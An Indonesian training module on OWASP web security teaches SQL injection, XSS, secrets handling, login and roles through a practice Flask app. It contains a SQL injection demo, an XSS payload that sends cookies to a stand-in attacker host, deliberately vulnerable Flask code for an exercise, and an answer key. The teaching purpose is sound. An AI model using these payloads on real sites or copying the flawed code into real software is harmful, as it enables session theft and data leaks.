# Modul 4: Keamanan Aplikasi (OWASP)

| | |
|---|---|
| **Langkah di rencana** | [Level 3, Langkah 4](../03-mahir.md#langkah-4-keamanan-aplikasi-owasp) |
| **Sesi** | Sesi 4 |
| **Durasi** | 110 menit |
| **Prasyarat** | Modul 2–3 |
| **File latihan** | [`latihan/kunci/backend-lengkap/`](latihan/kunci/backend-lengkap/) (login + 2 peran + tes keamanan) |

## 🎯 Tujuan Pembelajaran

Setelah modul ini, peserta mampu:
1. Menjelaskan dan mencegah **SQL injection**, **XSS**, **rahasia di kode**, dan **hak akses yang rusak**.
2. Membedakan **autentikasi** (siapa Anda?) dan **otorisasi** (boleh melakukan apa?).
3. Menyimpan kata sandi dengan **hash**, dan mengelola kunci rahasia lewat environment.
4. Menulis **tes keamanan** (401, 403, input berbahaya) seperti menulis tes aturan bisnis.
5. Meninjau kode buatan AI dengan daftar periksa keamanan dan `/security-review`.

> ⚠️ Semua contoh serangan di modul ini hanya untuk **aplikasi latihan Anda sendiri**. Menguji keamanan sistem milik orang lain tanpa izin tertulis melanggar hukum (di Indonesia, antara lain UU ITE).

---

## 📖 Materi

### A. OWASP Top 10

**OWASP Top 10** (https://owasp.org/Top10/) adalah daftar risiko keamanan aplikasi web yang paling sering terjadi, disusun oleh komunitas keamanan dan diperbarui berkala. Modul ini fokus pada 4 risiko yang paling sering muncul di aplikasi internal buatan sendiri:

| Risiko | Analogi | Pencegahan utama |
|--------|---------|------------------|
| **Hak akses rusak** (*broken access control*) | Semua karyawan punya kunci ruang arsip | Cek login **dan** hak akses di setiap endpoint, di backend |
| **Injection** (SQL injection) | Formulir yang isinya dibaca sebagai perintah | Parameter `?` / `:nama` |
| **XSS** | Papan pengumuman yang menjalankan apa pun yang ditempel | Tampilkan sebagai teks (React `{...}`, PHP `htmlspecialchars`) |
| **Rahasia & konfigurasi** | Kunci brankas ditempel di pintu | Environment variable, `.env` di `.gitignore`, `debug` mati |

AI bisa menulis kode yang **berfungsi** tetapi **tidak aman**. Tes fungsional tidak menangkapnya; Anda harus tahu apa yang dicari.

### B. SQL injection, dibuktikan

```python
import sqlite3

conn = sqlite3.connect(":memory:")
conn.execute("CREATE TABLE bookings (id INTEGER PRIMARY KEY, room TEXT, booked_by TEXT)")
conn.executemany(
    "INSERT INTO bookings (room, booked_by) VALUES (?, ?)",
    [("Merapi", "Tim HR"), ("Bromo", "Tim Legal"), ("Rinjani", "Direksi")],
)

room = "x' OR '1'='1"  # input "jahat" dari pengguna

unsafe = conn.execute(f"SELECT id, room, booked_by FROM bookings WHERE room = '{room}'").fetchall()
print("TIDAK AMAN:", unsafe)

safe = conn.execute("SELECT id, room, booked_by FROM bookings WHERE room = ?", (room,)).fetchall()
print("AMAN      :", safe)
```

```
TIDAK AMAN: [(1, 'Merapi', 'Tim HR'), (2, 'Bromo', 'Tim Legal'), (3, 'Rinjani', 'Direksi')]
AMAN      : []
```

Versi tidak aman menjadi `WHERE room = 'x' OR '1'='1'`, yang **selalu benar**, sehingga semua data bocor. Versi aman mencari ruang yang benar-benar bernama `x' OR '1'='1`, yang tidak ada.

PHP dengan PDO memakai prinsip yang sama: `$pdo->prepare('... WHERE room = :room')` lalu `execute(['room' => $room])`.

### C. XSS

❌ `<div dangerouslySetInnerHTML={{ __html: komentar }} />` atau Flask `return f"<div>{komentar}</div>"`

✅ `<div>{komentar}</div>` di React; `{{ komentar }}` di template Jinja (Flask otomatis meng-*escape*); `<?= htmlspecialchars($komentar, ENT_QUOTES, 'UTF-8') ?>` di PHP.

Jika `komentar` berisi `<img src=x onerror="fetch('https://penyerang.example/?c='+document.cookie)">`, versi ❌ menjalankan kode itu di browser **setiap orang** yang membuka halaman.

### D. Autentikasi dan otorisasi

| | Autentikasi | Otorisasi |
|---|---|---|
| Pertanyaan | **Siapa** Anda? | **Boleh** melakukan apa? |
| Contoh | Login dengan username + kata sandi, atau SSO kantor | Staf menghapus booking miliknya; admin GA menghapus milik siapa pun |
| Jika gagal | `401 Unauthorized` | `403 Forbidden` |

Prinsip yang dipakai di [`booking_api.py`](latihan/kunci/backend-lengkap/booking_api.py):

1. **Kata sandi di-hash** (`generate_password_hash`), tidak pernah disimpan polos. Saat login, cocokkan dengan `check_password_hash`.
2. **Pesan login gagal selalu sama** ("Username atau kata sandi salah"), agar penyerang tidak bisa menebak username mana yang ada.
3. **Identitas diambil dari sesi**, bukan dari isi permintaan. `booked_by` di kunci diisi dari pengguna yang login; jika permintaan mengirim `"booked_by": "budi"`, nilai itu diabaikan.
4. **Hak akses dicek di setiap endpoint yang mengubah data**, di backend. Menyembunyikan tombol Hapus di frontend **bukan** pengamanan.
5. **Sesi** disimpan di cookie yang ditandatangani dengan `SECRET_KEY`. Tanpa `SECRET_KEY` yang rahasia, cookie bisa dipalsukan. Karena itu aplikasi **menolak berjalan** jika `FLASK_SECRET_KEY` tidak diset.

> 💡 Untuk aplikasi sungguhan di kantor, utamakan **SSO perusahaan** (misalnya login dengan akun Microsoft/Google kantor) atau fitur login dari framework (Flask-Login, Laravel Breeze). Jangan merancang sistem login sendiri dari nol untuk produksi. Kunci di modul ini dibuat sederhana untuk memahami prinsipnya.

### E. Rahasia dan konfigurasi

| ❌ | ✅ |
|----|----|
| `app.config["SECRET_KEY"] = "rahasia123"` | `os.environ["FLASK_SECRET_KEY"]`, nilai acak panjang dari `python -c "import secrets; print(secrets.token_hex(32))"` |
| `.env` ikut di-commit | `.env` di `.gitignore`; commit hanya [`.env.example`](latihan/kunci/backend-lengkap/.env.example) tanpa nilai |
| `app.run(debug=True)` di server | `debug` mati; pakai gunicorn (Modul 8). Mode debug Flask menampilkan konsol interaktif yang bisa **menjalankan kode Python** jika terbuka ke jaringan |
| Kata sandi lewat argumen perintah | Lewat environment variable (tidak tersimpan di riwayat terminal) |

**Jika rahasia pernah ter-commit, anggap sudah bocor:** ganti (*rotate*) segera. Menghapus commit tidak cukup.

### F. Hal lain yang perlu dicek

- **CSRF:** jika memakai cookie sesi, peramban bisa ikut mengirim cookie dari situs lain. Kunci memakai `SESSION_COOKIE_SAMESITE="Lax"` dan hanya menerima JSON; untuk form HTML biasa, pakai token CSRF (misalnya Flask-WTF).
- **Dependensi:** perbarui berkala (`pip list --outdated`, `npm audit`). Banyak celah datang dari library lama.
- **Log:** catat error dan siapa melakukan apa, tetapi **jangan** mencatat kata sandi, token, atau data pribadi yang tidak perlu (UU PDP).
- **HTTPS** di server sungguhan, agar kata sandi dan cookie tidak bisa disadap.

---

## 🛠️ Praktik Terpandu

**1. Buktikan SQL injection.** Simpan contoh di bagian B sebagai `sqli_demo.py` di folder utama, jalankan, lalu hapus filenya.

**2. Jalankan tes keamanan kunci.** Dari folder utama repositori:

```bash
pytest training/mahir/latihan/kunci/backend-lengkap -v
```

Hasilnya `14 passed`. Baca nama-nama tesnya: `test_tanpa_login_ditolak`, `test_staff_tidak_boleh_menghapus_milik_orang_lain`, `test_sql_injection_di_login_tidak_berbahaya`, `test_kata_sandi_tidak_disimpan_polos`, dan seterusnya. **Tes keamanan ditulis sama seperti tes aturan bisnis.**

**3. Coba sebagai pengguna.** Jalankan backend lengkap dengan pengguna latihan (kata sandi contoh, bukan kata sandi asli Anda):

```bash
cd training/mahir/latihan/kunci/backend-lengkap
```

macOS/Linux:

```bash
export FLASK_SECRET_KEY="$(python -c 'import secrets; print(secrets.token_hex(32))')"
```

```bash
NEW_USER_PASSWORD="latihan-ani-123" python booking_api.py add-user ani staff
```

```bash
python booking_api.py run
```

Di Windows PowerShell: `$env:FLASK_SECRET_KEY = python -c "import secrets; print(secrets.token_hex(32))"`, lalu `$env:NEW_USER_PASSWORD = "latihan-ani-123"`, lalu `python booking_api.py add-user ani staff`, lalu `python booking_api.py run`.

Di terminal kedua, coba tanpa login (harus `401`):

```bash
curl -i http://127.0.0.1:5000/api/bookings
```

```
HTTP/1.1 401 UNAUTHORIZED
...
{
  "error": "Silakan login terlebih dahulu"
}
```

Lalu login dan simpan cookie sesinya di file `cookies.txt` (opsi `-c` menyimpan, `-b` mengirim):

```bash
curl -c cookies.txt -X POST http://127.0.0.1:5000/api/login -H "Content-Type: application/json" -d "{\"username\": \"ani\", \"password\": \"latihan-ani-123\"}"
```

Login membalas `{"role": "staff", "username": "ani"}`. Kini dengan cookie:

```bash
curl -b cookies.txt http://127.0.0.1:5000/api/bookings
```

Balasannya `[]` (daftar kosong, kode 200). Login berhasil, dan cookie sesi membuktikan siapa Anda di setiap permintaan berikutnya. `cookies.txt` berisi sesi login Anda: **jangan dibagikan atau di-commit**.

Setelah selesai: hentikan server, hapus `cookies.txt` dan `bookings.db`.

**4. Minta tinjauan keamanan** atas proyek Anda di Claude Code:

```
/security-review
```

Atau secara spesifik:

```
Tinjau projects/ruang-rapat dengan sudut pandang OWASP Top 10.
Untuk setiap temuan: jelaskan risikonya, tunjukkan baris kodenya, dan usulkan perbaikan.
Urutkan dari yang paling berbahaya. Jangan ubah file apa pun.
```

Catat temuannya. Anda akan memperbaikinya di Latihan 4.3.

---

## 🏋️ Latihan

### ⭐ Latihan 4.1: 401 atau 403?

Tentukan kode yang tepat: (a) belum login lalu membuka daftar booking; (b) login sebagai staf `budi`, menghapus booking milik `ani`; (c) login sebagai admin, menghapus booking `#999` yang tidak ada; (d) login dengan kata sandi salah.

### ⭐⭐ Latihan 4.2: Temukan celahnya

Kode buatan AI berikut **berfungsi**. Temukan minimal **6** masalah keamanan:

```python
from flask import Flask, jsonify, request

app = Flask(__name__)
app.config["SECRET_KEY"] = "rahasia123"


@app.post("/api/login")
def login():
    data = request.get_json()
    user = db.execute("SELECT * FROM users WHERE username = ?", (data["username"],)).fetchone()
    if user is None:
        return jsonify(error="Username tidak terdaftar"), 401
    if user["password"] != data["password"]:
        return jsonify(error="Kata sandi salah"), 401
    return jsonify(ok=True)


@app.get("/api/bookings/search")
def search():
    room = request.args.get("room", "")
    rows = db.execute(f"SELECT * FROM bookings WHERE room = '{room}'").fetchall()
    return jsonify([dict(r) for r in rows])


@app.delete("/api/bookings/<int:booking_id>")
def delete_booking(booking_id):
    db.execute("DELETE FROM bookings WHERE id = ?", (booking_id,))
    db.commit()
    return "", 204


@app.get("/api/bookings/<int:booking_id>/note")
def booking_note(booking_id):
    row = db.execute("SELECT note FROM bookings WHERE id = ?", (booking_id,)).fetchone()
    return f"<h1>Catatan</h1><div>{row['note']}</div>"


if __name__ == "__main__":
    app.run(host="0.0.0.0", debug=True)
```

### ⭐⭐ Latihan 4.3: Tindak lanjuti `/security-review`

Untuk setiap temuan dari Praktik langkah 4: perbaiki, atau tulis alasan mengapa risiko itu diterima. Untuk setiap perbaikan, tambahkan **satu tes** yang membuktikannya.

### ⭐⭐⭐ Latihan 4.4: Login di proyek Anda

Tambahkan login dan 2 peran ke `projects/ruang-rapat/backend` (boleh berpedoman pada kunci). Minimal 5 tes: tanpa login → 401, staf menghapus milik orang lain → 403, admin boleh, kata sandi tidak disimpan polos, aplikasi menolak jalan tanpa `FLASK_SECRET_KEY`. Lalu perbarui frontend agar punya form login.

---

## 📝 Kuis

1. Jelaskan SQL injection dengan analogi kepada rekan yang bukan programmer.
2. Apa beda kode `401` dan `403`?
3. Mengapa pesan "Username tidak terdaftar" dan "Kata sandi salah" sebaiknya disamakan?
4. Mengapa `booked_by` sebaiknya diambil dari sesi login, bukan dari isi permintaan?
5. Kunci rahasia terlanjur ter-push ke GitHub. Apa langkah pertama Anda?

---

## 📌 Ringkasan

- 4 risiko utama: **hak akses rusak, injection, XSS, rahasia & konfigurasi**.
- **401** = belum dikenali; **403** = dikenali tetapi tidak berhak. Cek keduanya **di backend**, di setiap endpoint yang mengubah data.
- Kata sandi di-hash; identitas dari sesi; `SECRET_KEY` dari environment; `debug` mati.
- Tes keamanan ditulis seperti tes biasa. `/security-review` membantu, tetapi **Anda** yang memutuskan dan memverifikasi.

---

<details>
<summary>🔑 <b>Kunci Jawaban</b></summary>

**Latihan 4.1:** (a) `401`; (b) `403`; (c) `404` (sudah login dan berhak, tetapi datanya tidak ada); (d) `401`.

**Latihan 4.2:** masalahnya:
1. **Rahasia di kode:** `SECRET_KEY = "rahasia123"` (pendek, mudah ditebak, ikut ter-commit). Baca dari environment; jika sudah ter-commit, ganti.
2. **Kata sandi disimpan polos** (`user["password"] != data["password"]`). Simpan hash, cocokkan dengan `check_password_hash`.
3. **Pesan login berbeda** untuk username salah dan kata sandi salah, sehingga penyerang bisa mencari username yang ada.
4. **Login tidak membuat sesi** (`return jsonify(ok=True)` saja), jadi tidak ada yang bisa dicek di endpoint lain. Tidak ada pembatasan percobaan login juga (*brute force*).
5. **SQL injection** di `/search` (f-string). Pakai `?`. Bonus: `SELECT *` bisa ikut mengirim kolom yang tidak perlu (misalnya kolom kata sandi di `users`); sebut kolomnya satu per satu.
6. **Hak akses rusak** di `DELETE`: siapa pun, bahkan tanpa login, bisa menghapus booking siapa pun. Tambahkan cek login (401) dan pemilik/admin (403).
7. **XSS** di `/note`: catatan pengguna digabung ke HTML. Kembalikan JSON dan tampilkan sebagai teks di React, atau pakai template yang meng-escape.
8. **`debug=True` dengan `host="0.0.0.0"`**: konsol debug Werkzeug terbuka ke seluruh jaringan. Matikan `debug`; pakai gunicorn di produksi.
9. Bonus: `request.get_json()` tanpa `silent=True` dan tanpa validasi → isi yang salah menghasilkan error 400/500 yang tidak terkendali, dan `row['note']` error 500 jika ID tidak ada (seharusnya 404).

**Latihan 4.3:** yang dinilai: setiap temuan punya keputusan (perbaiki/terima) dengan alasan, dan setiap perbaikan punya tes. Temuan yang **ditutup** tanpa tes cenderung muncul lagi.

**Latihan 4.4:** lihat [`latihan/kunci/backend-lengkap/`](latihan/kunci/backend-lengkap/) (14 tes lulus). Di frontend, setelah login berhasil, peramban otomatis mengirim cookie sesi untuk permintaan ke alamat yang sama (lewat proxy Vite), jadi `fetch("/api/bookings")` tidak perlu diubah. Tampilkan form login jika `GET /api/bookings` membalas 401.

**Kuis**
1. Contoh: "Bayangkan formulir permintaan arsip yang dibaca petugas sebagai perintah. Jika ada yang menulis 'arsip X, **atau semua arsip**', petugas memberikan semuanya. Parameter `?` membuat petugas membaca isian hanya sebagai **nama arsip**, bukan perintah."
2. `401` = belum login / identitas tidak dikenal. `403` = sudah dikenal, tetapi tidak berhak melakukan tindakan itu.
3. Agar penyerang tidak bisa mengetahui username mana yang terdaftar, sehingga menebak kata sandi menjadi lebih sulit.
4. Isi permintaan bisa diubah oleh siapa pun (misalnya dengan `curl`). Sesi login ditandatangani server, jadi lebih bisa dipercaya.
5. **Ganti (rotate)** kunci itu segera dan laporkan sesuai prosedur. Baru kemudian bersihkan kode dan pindahkan kunci ke environment.

</details>

---

← [Modul 3](modul-03-react.md) | **Berikutnya: [Modul 5: Fitur Lanjutan Claude Code →](modul-05-claude-code-lanjutan.md)**
